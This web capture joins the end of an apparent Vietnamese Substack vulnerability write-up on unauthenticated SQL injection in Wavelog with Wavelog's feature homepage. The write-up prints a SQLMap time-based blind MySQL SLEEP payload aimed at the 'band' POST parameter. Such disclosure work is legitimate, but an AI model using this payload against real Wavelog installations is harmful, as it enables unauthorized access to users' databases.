Mình sử dụng công cụ như **SQLMap** (công cụ tự động hóa quá trình khai thác lỗ hổng SQL Injection). SQLMap có thể tạo ra mã khai thác tùy chỉnh dựa trên phân tích tự động của ứng dụng mục tiêu và cơ sở dữ liệu liên quan.

Mã khai thác:

```
Parameter: #1* ((custom) POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: band=All' AND (SELECT 1241 FROM (SELECT(SLEEP(5)))zVSE) AND 'EgJT'='EgJT&mode=All&qsl=true&lotw=true&eqsl=false&qrz=false&orbit=All&sat=&propagation=111
```
#### Share this post

[![](https://substackcdn.com/image/fetch/w_520,h_272,c_fill,f_auto,q_auto:good,fl_progressive:steep,g_auto/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F78c2ee17-9f05-4794-9002-eaf7af45493b_1024x732.png)![Trung’s Substack](https://substackcdn.com/image/fetch/w_36,h_36,c_fill,f_auto,q_auto:good,fl_progressive:steep,g_auto/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F96c3aaa3-c48d-4e4d-adc0-2b4e3e4ba0c7_144x144.png)Trung’s SubstackUnauthenticated SQL Injection in Wavelog - Opensource project](https://substack.com/home/post/p-150197621?utm_campaign=post&utm_medium=web)Copy linkFacebookEmailNotesMoreShare
#### Discussion about this post

CommentsRestacks![](https://substackcdn.com/image/fetch/w_32,h_32,c_fill,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack.com%2Fimg%2Favatars%2Fdefault-light.png)TopLatestDiscussions

No posts

Ready for more?

Subscribe© 2025 Trung[Privacy](https://substack.com/privacy) ∙ [Terms](https://substack.com/tos) ∙ [Collection notice](https://substack.com/ccpa#personal-data-collected) [Start Writing](https://substack.com/signup?utm_source=substack&utm_medium=web&utm_content=footer)[Get the app](https://substack.com/app/app-store-redirect?utm_campaign=app-marketing&utm_content=web-footer-button)[Substack](https://substack.com) is the home for great culture
#### Share

Copy linkFacebookEmailNotesMore

This site requires JavaScript to run correctly. Please [turn on JavaScript](https://enable-javascript.com/) or unblock scripts



=== Content from www.wavelog.org_47b66f12_20250111_090826.html ===

[![](https://www.wavelog.org/wp-content/uploads/2024/11/wavelog_icon_only.png)](https://www.wavelog.org)

* [Features](#features)
* [About](#about)

* [Features](#features)
* [About](#about)

[Github](https://github.com/wavelog)

[Demo](https://demo.wavelog.org)

# next generation web-based logging

welcome to the future of amateur radio logging software

– flexible, versatile, simple –

just powerful

[Download on Github](https://github.com/wavelog/wavelog)

[Try the Demo](https://demo.wavelog.org)

[![Übersetzungsstatus](https://translate.wavelog.org/widget/wavelog/svg-badge.svg)](https://translate.wavelog.org/engage/wavelog/)

![GitHub License](https://img.shields.io/github/license/wavelog/wavelog)

![GitHub commit activity](https://img.shields.io/github/commit-activity/m/wavelog/wavelog)

![](https://www.wavelog.org/wp-content/uploads/2024/11/wavelog_logo-1024x1024.png)

## Features

![](https://www.wavelog.org/wp-content/uploads/2024/11/QSO-Logging-1024x732.png)

## logging made easy

With an easy and intuitive web interface you can easily log your contacts directly in the browser. Use our tiny helping tool WLGate to log from WSJT-X or to send CAT data directly\* from your radio to your Wavelog account.

Available for Windows, Mac and Linux.

\*needs FLrig running to get CAT data

![](https://www.wavelog.org/wp-content/uploads/2024/11/wlgate-1024x802.png)

![](https://www.wavelog.org/wp-content/uploads/2024/11/Wavelog-Map-e1713637058222-1024x722.png)

## powerful maps

Wavelog comes with powerful mapping tools. Easily export your QSOs as different maps, show them to your friends, and place an automatically generated map in your QRZ.com bio.

The maps are highly customizable.

![](https://www.wavelog.org/wp-content/uploads/2024/11/Globe-1024x803.png)

![](https://www.wavelog.org/wp-content/uploads/2024/11/Statistics-Bands-1024x483.png)

## true statistics

Analyze your work.

How many grids did you work? How many days per year did you do HamRadio? What was the farest distance you worked on 70cm band?

and much more..

![](https://www.wavelog.org/wp-content/uploads/2024/11/Gridsquare-Map-1.png)

![](https://www.wavelog.org/wp-content/uploads/2024/11/CQ-Award-Table-1024x826.png)

## honorable awards

Wavelog helps you to analyze your data and shows you how far/close you are from your next award certificate.

More then 20 awards all over the world have been implemented so far and more are following.

![](https://www.wavelog.org/wp-content/uploads/2024/11/CQ-Award-Map-1024x646.png)

![](https://www.wavelog.org/wp-content/uploads/2024/11/Logbook-Overview-1024x559.png)

## qsl management

The most common third party services are fully supported by Wavelog. You can sync your logs with eQSL, LotW, HRDlog, QRZ.com and QO-100 Dx Club. Your QSO’s are automatically confirmed with eQSL and LotW and eQSL cards can be directly viewed in the WebUI. Additionally you can upload scanned QSL cards for QSO’s.

![](https://www.wavelog.org/wp-content/uploads/2024/11/Bildschirmfoto-2024-05-02-um-09.22.43-1024x609.png)

## Multilanguage

Wavelog is translated in various different languages (partially). Some of them still need some work. The translations are created by the developers and the community. If you want to help translating just join us on our translation platform.

[https://translate.wavelog.org/](https://translate.wavelog.org/engage/wavelog/)

You can’t find your language on the translation platform? No problem! Send a mail to translation@wavelog.org and we will add your language to Wavelog.

[![Übersetzungsstatus](https://translate.wavelog.org/widget/wavelog/open-graph.png)](https://translate.wavelog.org/engage/wavelog/)

## About Wavelog

The work on this project started at the end of 2023 as a spin-off of the well-known amateur radio software Cloudlog. The four core developers – DF2ET, DJ7NT, HB9HIL and LA8AJA – who have pushed Cloudlog forward for months and years, decided to continue their work in a fork that led to Wavelog. Since its initial release on February 1st, 2024, Wavelog has made tremendous progress in terms of stability and functionality. We are proud that Wavelog is developed by radio amateurs for radio amateurs, without commercial motives, but out of pure passion for the hobby. Every line of code is the result of hard work to continuously improve this great piece of software. Wavelog stands for its simplicity, powerful tools, and open-source code. As a web application, Wavelog offers the great advantage of being accessible from anywhere in the world. Whether on a professional server, rented webspace or a RaspberryPi at home, Wavelog makes it possible to manage your logbook anytime, anywhere. Try it yourself and experience improved web-based logging on your server.

Wavelog is an

non-profit,
non-commercial,
open-source project.

Just because it is fun.

© Wavelog 2024

![](https://www.wavelog.org/wp-content/uploads/2024/11/wavelog_icon_only-1024x1024.png)


